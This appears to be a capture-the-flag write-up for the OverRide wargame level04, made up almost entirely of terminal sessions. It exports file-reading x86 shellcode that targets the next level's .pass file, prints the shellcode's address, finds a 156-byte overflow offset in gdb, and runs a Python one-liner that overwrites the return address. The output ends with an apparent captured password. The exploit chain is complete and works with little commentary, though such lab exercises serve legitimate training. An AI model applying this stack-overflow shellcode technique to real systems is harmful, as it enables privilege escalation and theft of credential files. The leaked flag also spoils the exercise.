```bash
export SHELLCODE=$'\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level05/.pass'
```

```bash
printf '%s\n' '#include <stdio.h>' '#include <stdlib.h>' 'int main(void){ printf("%p\n", getenv("SHELLCODE")); return 0; }' > /tmp/_tmp.c && gcc -O2 -m32 /tmp/_tmp.c -o /tmp/_tmp && /tmp/_tmp && rm -f /tmp/_tmp /tmp/_tmp.c
0xffffd8b8
```

```bash
level04@OverRide:~$ gdb level04
[...]
(gdb) set follow-fork-mode child
(gdb) run
Starting program: /home/users/level04/level04 
[New process 1998]
Give me some shellcode, k
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9
Program received signal SIGSEGV, Segmentation fault.
[Switching to process 1998]
0x41326641 in ?? ()  //offtset is 156
(gdb) 
```

```bash
python -c "print 156 * 'A' + '\xb8\xd8\xff\xff'" | ./level04
Give me some shellcode, k
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```
